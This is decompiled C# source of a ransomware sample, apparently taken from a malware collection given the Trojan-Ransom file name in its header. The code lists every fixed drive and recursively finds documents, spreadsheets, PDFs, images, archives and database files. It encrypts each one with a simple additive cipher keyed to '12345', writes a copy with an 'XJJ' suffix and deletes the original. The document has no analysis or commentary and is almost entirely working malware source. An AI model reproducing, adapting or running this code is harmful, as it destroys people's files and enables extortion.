// Decompiled with JetBrains decompiler
// Type: Windows.Module1
// Assembly: Kanalia, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 824CEAF0-9FAE-476A-BFCB-872CD621BA45
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Encoder.gen-87fbcaaa029236f3a6b7de6cd8dbbd811804e0b26142c1395b0e9e84f57aaaed.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Windows.My;

namespace Windows
{
  [StandardModule]
  internal sealed class Module1
  {
    public static string perData;
    public static string perFormat;
    public static string Put;
    public static ReadOnlyCollection<string> p = MyProject.Application.CommandLineArgs;

    [STAThread]
    public static void Main()
    {
      Process currentProcess = Process.GetCurrentProcess();
      Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName, Interaction.Environ("computername"));
      int index1 = 0;
      int num1;
      while (index1 < processesByName.Length)
      {
        if (Operators.CompareString(processesByName[index1].MainModule.ModuleName, currentProcess.MainModule.ModuleName, false) == 0)
          checked { ++num1; }
        checked { ++index1; }
      }
      if (num1 > 1)
        Process.GetCurrentProcess().Kill();
      Console.WriteLine("Start...");
      string[] strArray1 = Module1.DISK().Split('|');
      string[] strArray2 = new string[20]
      {
        null,
        "*.doc",
        "*.docx",
        "*.xls",
        "*.xlsx",
        "*.pdf",
        "*.jpg",
        "*.png",
        "*.zip",
        "*.rar",
        "*.odt",
        "*.MD",
        "*.DD",
        "*.USR",
        "*.CDX",
        "*.DBF",
        "*.dot",
        "*.bmp",
        "*.ppt",
        "*.tif"
      };
      strArray2[19] = "*.txt";
      int num2 = checked (strArray1.Length - 1);
      int index2 = 0;
      while (index2 <= num2)
      {
        int length = strArray2.Length;
        int index3 = 0;
        while (index3 <= length)
        {
          try
          {
            Module1.GetFindSub(strArray1[index2], strArray2[index3]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index3; }
        }
        checked { ++index2; }
      }
      try
      {
        File.Delete(Module1.Put);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Console.WriteLine("END");
    }

    public static void shifrator(string pass, string InputFile, string outputfile, string Crypt)
    {
      byte[] numArray1 = File.ReadAllBytes(InputFile);
      byte[] bytes1 = new byte[checked (numArray1.Length - 1 + 1)];
      int length = pass.Length;
      byte[] bytes2 = Encoding.ASCII.GetBytes(pass);
      int[] numArray2 = new int[checked (bytes2.Length - 1 + 1)];
      bytes2.CopyTo((Array) numArray2, 0);
      if (Conversions.ToBoolean(Crypt))
      {
        int num = checked (numArray1.Length - 1);
        int index = 0;
        while (index <= num)
        {
          bytes1[index] = checked ((byte) unchecked (checked ((int) numArray1[index] + numArray2[unchecked (index % length)]) % 256));
          checked { ++index; }
        }
      }
      else
      {
        int num = checked (numArray1.Length - 1);
        int index = 0;
        while (index <= num)
        {
          bytes1[index] = checked ((byte) unchecked (checked (256 + (int) numArray1[index] - numArray2[unchecked (index % length)]) % 256));
          checked { ++index; }
        }
      }
      File.WriteAllBytes(outputfile, bytes1);
    }

    public static byte B(char s, byte inp, bool Crypt) => Crypt ? Conversions.ToByte(Interaction.IIf(checked ((int) inp + Strings.Asc(s)) > (int) byte.MaxValue, (object) checked ((int) inp + Strings.Asc(s) - 256), (object) checked ((int) inp + Strings.Asc(s)))) : Conversions.ToByte(Interaction.IIf(checked ((int) inp + Strings.Asc(s)) < 0, (object) checked (256 + (int) inp - Strings.Asc(s)), (object) checked ((int) inp - Strings.Asc(s))));

    public static void GetFindSub(string d, string f)
    {
      try
      {
        Application.DoEvents();
        string[] files = Directory.GetFiles(d, f);
        string[] directories = Directory.GetDirectories(d);
        string[] strArray1 = files;
        int index1 = 0;
        while (index1 < strArray1.Length)
        {
          string str = strArray1[index1];
          Console.WriteLine(str);
          try
          {
            Module1.shifrator("12345", str, str + "XJJ", Conversions.ToString(true));
            File.Delete(str);
            Console.WriteLine(" - Зашифрован");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Console.WriteLine(" - ОШИБКА");
            ProjectData.ClearProjectError();
          }
          checked { ++index1; }
        }
        string[] strArray2 = directories;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          Module1.GetFindSub(strArray2[index2], f);
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string DISK()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      object Left;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.DriveType == DriveType.Fixed)
          Left = Operators.AddObject(Operators.AddObject(Left, (object) driveInfo.Name), (object) "|");
        checked { ++index; }
      }
      return Conversions.ToString(Left);
    }
  }
}
